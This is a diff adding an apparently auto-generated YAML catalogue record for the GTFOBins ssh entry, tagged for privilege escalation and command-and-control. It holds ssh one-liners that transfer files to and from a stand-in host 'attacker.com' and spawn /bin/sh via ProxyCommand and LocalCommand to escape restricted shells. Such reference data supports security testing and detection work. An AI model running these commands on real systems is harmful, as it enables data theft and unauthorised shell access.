@@ -1,0 +1,108 @@
+id: gtfobins/ssh/download/suid
+type: binary
+platform: linux
+name: ssh
+phases:
+- command-and-control
+- privilege-escalation
+capabilities:
+- file-download
+privilege_required: suid
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: GPL-3.0
+  upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+  last_synced: '2026-11-13'
+commands:
+- template: ssh user@attacker.com 'cat /path/to/input-file"
+references:
+- https://gtfobins.github.io/gtfobins/ssh/
+tags:
+- linux
+- unix
+- gtfobins
+source_data:
+  GTFOBins:
+    raw:
+      documents:
+        ssh:
+          functions:
+            download:
+            - code: ssh user@attacker.com 'cat /path/to/input-file"
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+              sender: ssh-server
+            file-read:
+            - code: ssh -F /path/to/input-file x
+              comment: The read file content is corrupted by error prints.
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+            shell:
+            - code: ssh localhost /bin/sh
+              comment: Reconnecting may help bypassing restricted shells.
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+            - code: ssh -o ProxyCommand=';/bin/sh 0<&2 1>&2' x
+              contexts:
+                sudo: null
+                unprivileged: null
+            - code: ssh -o PermitLocalCommand=yes -o LocalCommand=/bin/sh localhost
+              comment: Spawn the shell on the client, but still requires a successful remote connection.
+              contexts:
+                sudo: null
+                unprivileged: null
+            upload:
+            - code: echo DATA | ssh user@attacker.com 'cat >/path/to/output-file"
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+              receiver: ssh-server
+    upstream_url: https://gtfobins.github.io/gtfobins/ssh/
+    upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: file-download
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  phases:
+  - value: command-and-control
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  - value: privilege-escalation
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  privilege_required:
+    value: suid
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    GTFOBins: sha256:9c37ab33c823d8cb65dcbddcf03148b3e0f0a9df3beff7b10d46acc9de912ed2
